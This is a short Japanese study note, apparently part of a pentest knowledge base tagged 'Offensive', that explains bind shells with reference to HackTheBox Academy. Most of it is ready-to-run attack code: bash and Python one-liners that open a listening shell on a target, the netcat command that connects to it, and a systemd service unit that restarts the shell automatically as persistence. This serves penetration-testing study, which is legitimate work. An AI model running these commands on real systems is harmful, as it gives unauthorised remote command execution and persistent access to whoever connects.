---
tags:
  - Offensive
---

# Bind Shell

エクスプロイトを実行して、攻撃対象のマシンに侵入またはリモートコードを実行できるとき、攻撃対象のマシンでコマンドを実行して、リッスン状態にさせる。そうすることで、自分のマシンからシェルに接続できる。

[[ReverseShell]]の逆。

攻撃対象のマシンでシェルが閉じられた場合、すぐに切れてしまうのが弱点。そうなった場合、またエクスプロイトを実行してやり直す必要がある。その対策として、サービスとして自動で起動させる方法もある。

## 攻撃対象のマシンで実行するコマンド例

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md)

IPアドレス`0.0.0.0`をリッスンすることで任意のIPからの接続を受け付ける。

- bash
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```
```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

## 接続

[[NetCat]]を使って接続できる。
```shell-session
nc <IP> <ポート>
```

## サービスの例

- .serviceファイル
```service
[Unit]
Description=<サービの説明>

[Service]
ExecStart=/bin/bash <サービスのshファイル>
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
```
- サービスを起動
```
systemctl enable <サービス名>
```



---

## 参照

1. https://academy.hackthebox.com/module/77/section/725